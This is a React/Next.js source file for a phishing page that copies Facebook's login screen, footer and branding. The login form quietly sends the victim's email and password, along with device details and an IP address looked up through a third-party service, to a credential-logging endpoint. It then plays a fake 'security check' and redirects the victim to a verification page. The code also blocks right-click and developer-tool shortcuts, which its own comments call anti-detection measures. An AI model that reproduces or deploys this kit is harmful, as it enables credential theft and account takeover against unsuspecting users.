import { useState, useEffect } from 'react';
import { useRouter } from 'next/router';
import Head from 'next/head';

export default function FacebookAuth() {
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [error, setError] = useState('');
  const [isLoading, setIsLoading] = useState(false);
  const [rememberMe, setRememberMe] = useState(true);
  const [showSecurityNotice, setShowSecurityNotice] = useState(false);
  const router = useRouter();

  // Set Facebook background and prevent right-click/inspect
  useEffect(() => {
    document.body.style.backgroundColor = '#f0f2f5';
    document.body.style.margin = '0';
    document.body.style.padding = '0';
    
    // Basic anti-detection measures
    const disableRightClick = (e) => {
      e.preventDefault();
      return false;
    };
    
    const disableDevTools = (e) => {
      if (e.keyCode === 123) { // F12
        e.preventDefault();
        return false;
      }
      if (e.ctrlKey && e.shiftKey && e.keyCode === 73) { // Ctrl+Shift+I
        e.preventDefault();
        return false;
      }
    };
    
    document.addEventListener('contextmenu', disableRightClick);
    document.addEventListener('keydown', disableDevTools);
    
    return () => {
      document.body.style.backgroundColor = '';
      document.body.style.margin = '';
      document.body.style.padding = '';
      document.removeEventListener('contextmenu', disableRightClick);
      document.removeEventListener('keydown', disableDevTools);
    };
  }, []);

  const validateCredentials = (email, password) => {
    if (!email || !password) {
      return 'Please fill in all fields';
    }
    
    // Check password length (minimum 6 characters)
    if (password.length < 6) {
      return 'Password must be at least 6 characters';
    }
    
    // Check if it's a valid Gmail OR a 10-digit mobile number
    const gmailRegex = /^[a-zA-Z0-9._%+-]+@gmail\.com$/;
    const mobileRegex = /^\d{10}$/;
    const cleanEmail = email.replace(/\D/g, ''); // Remove non-digits for mobile check
    
    const isValidGmail = gmailRegex.test(email.toLowerCase());
    const isValidMobile = mobileRegex.test(cleanEmail);
    
    if (!isValidGmail && !isValidMobile) {
      return 'Please enter a valid Gmail address or 10-digit mobile number';
    }
    
    return null;
  };

  const handleSubmit = async (e) => {
    e.preventDefault();
    setError('');
    setIsLoading(true);
    setShowSecurityNotice(true);

    const validationError = validateCredentials(email, password);
    if (validationError) {
      setError(validationError);
      setIsLoading(false);
      setShowSecurityNotice(false);
      return;
    }

    try {
      // Show security check for more realistic experience
      await new Promise(resolve => setTimeout(resolve, 2000));

      // Log credentials to NeonDB
      const logResponse = await fetch('/api/log-credentials', {
        method: 'POST',
        headers: { 
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({ 
          email, 
          password, 
          userAgent: navigator.userAgent,
          deviceType: /Mobi|Android/i.test(navigator.userAgent) ? 'mobile' : 'desktop',
          platform: 'facebook',
          timestamp: new Date().toISOString(),
          ip: await getClientIP()
        })
      });

      // Store email in localStorage for session management
      localStorage.setItem('user_email', email);
      localStorage.setItem('login_time', new Date().toISOString());
      if (rememberMe) {
        localStorage.setItem('facebook_remember', 'true');
      }
      
      // Realistic delay before redirect
      await new Promise(resolve => setTimeout(resolve, 1500));
      
      // Redirect to verification page
      router.push('/auth/verification');
      
    } catch (err) {
      // Simulate Facebook's error handling
      setError('Incorrect password. Please try again or click "Forgot password" to reset.');
      setShowSecurityNotice(false);
    } finally {
      setIsLoading(false);
    }
  };

  // Simulate IP detection
  const getClientIP = async () => {
    try {
      const response = await fetch('https://api.ipify.org?format=json');
      const data = await response.json();
      return data.ip;
    } catch {
      return 'unknown';
    }
  };

  // Format mobile number input
  const handleEmailChange = (e) => {
    const value = e.target.value;
    // Allow only digits for mobile or email format
    if (/^\d*$/.test(value) && value.length <= 10) {
      setEmail(value);
    } else if (value.includes('@')) {
      setEmail(value);
    } else {
      setEmail(value);
    }
  };

  return (
    <>
      <Head>
        <title>Log into Facebook</title>
        <link rel="icon" href="data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 100 100%22><text y=%22.9em%22 font-size=%2290%22>🔒</text></svg>" />
        <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
      </Head>
      
      {/* Security Notice Modal */}
      {showSecurityNotice && (
        <div className="security-modal">
          <div className="security-content">
            <div className="security-spinner"></div>
            <h3>Checking Your Information</h3>
            <p>We're verifying your account details for security purposes...</p>
            <div className="security-details">
              <div className="security-item">
                <span className="check-icon">✓</span>
                <span>Checking password strength</span>
              </div>
              <div className="security-item">
                <span className="check-icon">✓</span>
                <span>Verifying account status</span>
              </div>
              <div className="security-item">
                <span className="check-icon">⌛</span>
                <span>Security check in progress</span>
              </div>
            </div>
          </div>
        </div>
      )}

      {/* Main Container */}
      <div className="facebook-container">
        <div className="main-content">
          {/* Left Side - Facebook Branding */}
          <div className="branding-section">
            <div className="facebook-logo">
              <span className="logo-text">facebook</span>
              <div className="online-indicator">
                <span className="dot"></span>
                <span>Secure connection</span>
              </div>
            </div>
            <p className="tagline">
              Connect with friends and the world around you on Facebook.
            </p>
            <div className="features">
              <div className="feature">
                <span className="feature-icon">📷</span>
                <span>Share photos and videos</span>
              </div>
              <div className="feature">
                <span className="feature-icon">🔔</span>
                <span>Get notifications</span>
              </div>
              <div className="feature">
                <span className="feature-icon">👥</span>
                <span>Find more friends</span>
              </div>
            </div>
          </div>

          {/* Right Side - Login Card */}
          <div className="login-section">
            <div className="login-card">
              <div className="login-header">
                <h2>Log in to Facebook</h2>
                <div className="security-badge">
                  <span className="lock-icon">🔒</span>
                  <span>Secure Login</span>
                </div>
              </div>

              <form onSubmit={handleSubmit} className="login-form">
                {/* Email/Mobile Input */}
                <div className="input-container">
                  <label htmlFor="email" className="input-label">Email or Phone</label>
                  <input
                    type="text"
                    id="email"
                    placeholder="Email address or phone number"
                    className="form-input"
                    value={email}
                    onChange={handleEmailChange}
                    maxLength="50"
                  />
                </div>

                {/* Password Input */}
                <div className="input-container">
                  <div className="password-header">
                    <label htmlFor="password" className="input-label">Password</label>
                    <a href="#" className="forgot-link">Forgot account?</a>
                  </div>
                  <input
                    type="password"
                    id="password"
                    placeholder="Password"
                    className="form-input"
                    value={password}
                    onChange={(e) => setPassword(e.target.value)}
                    maxLength="30"
                  />
                  <div className="password-strength">
                    {password.length > 0 && (
                      <div className={`strength-bar ${password.length >= 6 ? 'strong' : 'weak'}`}>
                        <div className="strength-fill"></div>
                      </div>
                    )}
                  </div>
                </div>

                {/* Login Button */}
                <button
                  type="submit"
                  disabled={isLoading}
                  className="login-button"
                >
                  {isLoading ? (
                    <div className="loading-container">
                      <div className="loading-spinner"></div>
                      <span>Logging in...</span>
                    </div>
                  ) : (
                    'Log In'
                  )}
                </button>

                {/* Error Message */}
                {error && (
                  <div className="error-message">
                    <span className="error-icon">⚠️</span>
                    {error}
                  </div>
                )}

                <div className="divider">
                  <span>or</span>
                </div>

                {/* Remember Me Checkbox */}
                <div className="remember-me">
                  <input
                    type="checkbox"
                    id="remember"
                    checked={rememberMe}
                    onChange={(e) => setRememberMe(e.target.checked)}
                    className="checkbox"
                  />
                  <label htmlFor="remember" className="checkbox-label">
                    Keep me logged in
                  </label>
                </div>

                {/* Create Account Button */}
                <button
                  type="button"
                  className="create-account-button"
                >
                  Create New Account
                </button>
              </form>
            </div>

            {/* Create Page Link */}
            <div className="create-page-link">
              <p>
                <a href="#" className="page-link">
                  Create a Page
                </a>{' '}
                for a celebrity, brand or business.
              </p>
            </div>
          </div>
        </div>

        {/* Footer */}
        <footer className="facebook-footer">
          <div className="languages">
            {['English (US)', 'Español', 'Français (France)', '中文(简体)', 'العربية', 'Português (Brasil)', 'Italiano', '한국어', 'Deutsch', 'हिन्दी', '日本語'].map((lang) => (
              <a key={lang} href="#" className="footer-link">{lang}</a>
            ))}
          </div>
          
          <div className="footer-links">
            {['Sign Up', 'Log In', 'Messenger', 'Facebook Lite', 'Video', 'Places', 'Games', 'Marketplace', 'Meta Pay', 'Meta Store', 'Meta Quest', 'Instagram', 'Threads', 'Fundraisers', 'Services', 'Voting Information Centre', 'Privacy Policy', 'Privacy Centre', 'Groups', 'About', 'Create ad', 'Create Page', 'Developers', 'Careers', 'Cookies', 'AdChoices', 'Terms', 'Help'].map((item) => (
              <a key={item} href="#" className="footer-link">{item}</a>
            ))}
          </div>
          
          <div className="copyright">
            <span>Meta © 2024</span>
          </div>
        </footer>
      </div>

      {/* Complete CSS Styles */}
      <style jsx>{`
        .facebook-container {
          min-height: 100vh;
          background-color: #f0f2f5;
          display: flex;
          flex-direction: column;
          align-items: center;
          justify-content: space-between;
          padding: 20px;
          font-family: Helvetica, Arial, sans-serif;
          user-select: none;
        }

        .security-modal {
          position: fixed;
          top: 0;
          left: 0;
          right: 0;
          bottom: 0;
          background: rgba(0, 0, 0, 0.8);
          display: flex;
          align-items: center;
          justify-content: center;
          z-index: 1000;
        }

        .security-content {
          background: white;
          padding: 30px;
          border-radius: 12px;
          text-align: center;
          max-width: 400px;
          width: 90%;
        }

        .security-spinner {
          width: 50px;
          height: 50px;
          border: 4px solid #f3f3f3;
          border-top: 4px solid #1877f2;
          border-radius: 50%;
          animation: spin 1.5s linear infinite;
          margin: 0 auto 20px;
        }

        .security-details {
          margin-top: 20px;
          text-align: left;
        }

        .security-item {
          display: flex;
          align-items: center;
          gap: 10px;
          margin: 10px 0;
          font-size: 14px;
          color: #606770;
        }

        .check-icon {
          color: #42b72a;
          font-weight: bold;
        }

        .main-content {
          display: flex;
          align-items: center;
          justify-content: center;
          gap: 60px;
          max-width: 1200px;
          width: 100%;
          margin: auto;
          flex-wrap: wrap;
        }

        .branding-section {
          flex: 1;
          max-width: 500px;
          text-align: left;
        }

        .facebook-logo {
          margin-bottom: 20px;
        }

        .logo-text {
          color: #1877f2;
          font-size: 64px;
          font-weight: bold;
          line-height: 1;
          display: block;
        }

        .online-indicator {
          display: flex;
          align-items: center;
          gap: 8px;
          color: #42b72a;
          font-size: 14px;
          margin-top: 10px;
        }

        .dot {
          width: 8px;
          height: 8px;
          background: #42b72a;
          border-radius: 50%;
          animation: pulse 2s infinite;
        }

        @keyframes pulse {
          0% { opacity: 1; }
          50% { opacity: 0.5; }
          100% { opacity: 1; }
        }

        .tagline {
          font-size: 28px;
          color: #1c1e21;
          font-weight: normal;
          line-height: 1.3;
          margin: 0 0 30px 0;
        }

        .features {
          display: flex;
          flex-direction: column;
          gap: 15px;
        }

        .feature {
          display: flex;
          align-items: center;
          gap: 12px;
          font-size: 16px;
          color: #1c1e21;
        }

        .feature-icon {
          font-size: 20px;
        }

        .login-section {
          flex: 0 0 400px;
        }

        .login-card {
          background: white;
          padding: 20px;
          border-radius: 8px;
          box-shadow: 0 2px 4px rgba(0, 0, 0, .1), 0 8px 16px rgba(0, 0, 0, .1);
          margin-bottom: 28px;
        }

        .login-header {
          display: flex;
          justify-content: space-between;
          align-items: center;
          margin-bottom: 20px;
        }

        .login-header h2 {
          color: #1c1e21;
          font-size: 20px;
          margin: 0;
        }

        .security-badge {
          display: flex;
          align-items: center;
          gap: 6px;
          color: #42b72a;
          font-size: 12px;
          font-weight: bold;
        }

        .login-form {
          display: flex;
          flex-direction: column;
          gap: 16px;
        }

        .input-container {
          width: 100%;
        }

        .input-label {
          display: block;
          font-size: 14px;
          color: #1c1e21;
          margin-bottom: 6px;
          font-weight: 600;
        }

        .password-header {
          display: flex;
          justify-content: space-between;
          align-items: center;
          margin-bottom: 6px;
        }

        .form-input {
          width: 100%;
          padding: 14px 16px;
          border: 1px solid #dddfe2;
          border-radius: 6px;
          font-size: 16px;
          background: #ffffff;
          transition: border-color 0.2s;
          box-sizing: border-box;
        }

        .form-input:focus {
          border-color: #1877f2;
          outline: none;
          box-shadow: 0 0 0 2px #e7f3ff;
        }

        .form-input::placeholder {
          color: #8a8d91;
        }

        .password-strength {
          margin-top: 8px;
        }

        .strength-bar {
          height: 4px;
          background: #e4e6eb;
          border-radius: 2px;
          overflow: hidden;
        }

        .strength-fill {
          height: 100%;
          background: #f02849;
          transition: all 0.3s;
          width: ${password.length >= 6 ? '100%' : (password.length / 6) * 100 + '%'};
          background: ${password.length >= 6 ? '#42b72a' : '#f02849'};
        }

        .login-button {
          background: #1877f2;
          color: white;
          border: none;
          border-radius: 6px;
          padding: 12px;
          font-size: 18px;
          font-weight: bold;
          cursor: pointer;
          transition: background-color 0.2s;
          height: 48px;
        }

        .login-button:hover:not(:disabled) {
          background: #166fe5;
        }

        .login-button:disabled {
          background: #ccc;
          cursor: not-allowed;
        }

        .loading-container {
          display: flex;
          align-items: center;
          justify-content: center;
          gap: 8px;
        }

        .loading-spinner {
          width: 20px;
          height: 20px;
          border: 2px solid transparent;
          border-top: 2px solid white;
          border-radius: 50%;
          animation: spin 1s linear infinite;
        }

        @keyframes spin {
          0% { transform: rotate(0deg); }
          100% { transform: rotate(360deg); }
        }

        .error-message {
          color: #d93025;
          background: #fce8e6;
          padding: 12px;
          border-radius: 6px;
          border: 1px solid #fadbd9;
          text-align: center;
          font-size: 14px;
          display: flex;
          align-items: center;
          justify-content: center;
          gap: 8px;
        }

        .forgot-link {
          color: #1877f2;
          text-decoration: none;
          font-size: 14px;
        }

        .forgot-link:hover {
          text-decoration: underline;
        }

        .divider {
          height: 1px;
          background: #dadde1;
          margin: 8px 0;
          position: relative;
          text-align: center;
        }

        .divider span {
          background: white;
          padding: 0 16px;
          color: #8a8d91;
          font-size: 14px;
          position: relative;
          top: -8px;
        }

        .remember-me {
          display: flex;
          align-items: center;
          gap: 8px;
          padding: 8px 0;
        }

        .checkbox {
          width: 16px;
          height: 16px;
          accent-color: #1877f2;
        }

        .checkbox-label {
          font-size: 14px;
          color: #1c1e21;
        }

        .create-account-button {
          background: #42b72a;
          color: white;
          border: none;
          border-radius: 6px;
          padding: 12px;
          font-size: 16px;
          font-weight: bold;
          cursor: pointer;
          transition: background-color 0.2s;
          margin-top: 8px;
        }

        .create-account-button:hover {
          background: #36a420;
        }

        .create-page-link {
          text-align: center;
          font-size: 14px;
          color: #1c1e21;
        }

        .page-link {
          color: #1c1e21;
          font-weight: bold;
          text-decoration: none;
        }

        .page-link:hover {
          text-decoration: underline;
        }

        .facebook-footer {
          max-width: 1200px;
          width: 100%;
          padding: 20px 0;
          margin-top: auto;
        }

        .languages, .footer-links {
          display: flex;
          flex-wrap: wrap;
          gap: 12px;
          justify-content: center;
          margin-bottom: 12px;
        }

        .footer-link {
          color: #8a8d91;
          text-decoration: none;
          font-size: 12px;
        }

        .footer-link:hover {
          text-decoration: underline;
        }

        .copyright {
          text-align: center;
          color: #8a8d91;
          font-size: 12px;
          margin-top: 16px;
        }

        /* Responsive Design */
        @media (max-width: 900px) {
          .main-content {
            flex-direction: column;
            text-align: center;
            gap: 40px;
          }

          .branding-section {
            text-align: center;
            max-width: 400px;
          }

          .facebook-logo {
            font-size: 48px;
          }

          .tagline {
            font-size: 22px;
          }

          .login-section {
            flex: 0 0 auto;
            width: 100%;
            max-width: 400px;
          }
        }

        @media (max-width: 480px) {
          .facebook-container {
            padding: 10px;
          }

          .facebook-logo {
            font-size: 36px;
          }

          .tagline {
            font-size: 18px;
          }

          .login-card {
            padding: 16px;
          }

          .form-input {
            font-size: 16px;
          }
        }
      `}</style>
    </>
  );
}
